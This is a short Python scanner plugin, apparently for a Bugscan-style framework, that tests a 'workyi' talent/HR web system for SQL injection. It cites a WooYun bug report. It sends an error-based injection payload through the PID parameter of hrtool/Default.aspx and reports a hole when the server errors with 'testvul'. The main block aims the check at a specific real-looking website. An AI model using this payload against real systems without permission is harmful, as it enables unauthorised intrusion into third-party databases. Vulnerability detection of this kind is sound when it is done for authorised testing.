#!/usr/bin/python
#-*- encoding:utf-8 -*-
#title:workyi_Talent system SQL injection
#author: POX_HT
#ref: http://www.wooyun.org/bugs/wooyun-2010-0116453


def assign(service, arg):
    if service == "workyi_system":
        return True, arg


def audit(arg):
    payload = "hrtool/Default.aspx?PID=convert(int,%27tes%27%2b%27tvul%27)"
    url = arg + payload
    code, head,res, errcode, _url = curl.curl(url)
    if code==500 and 'testvul' in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('workyi_system', 'http://www.tjkyhr.com/')[1])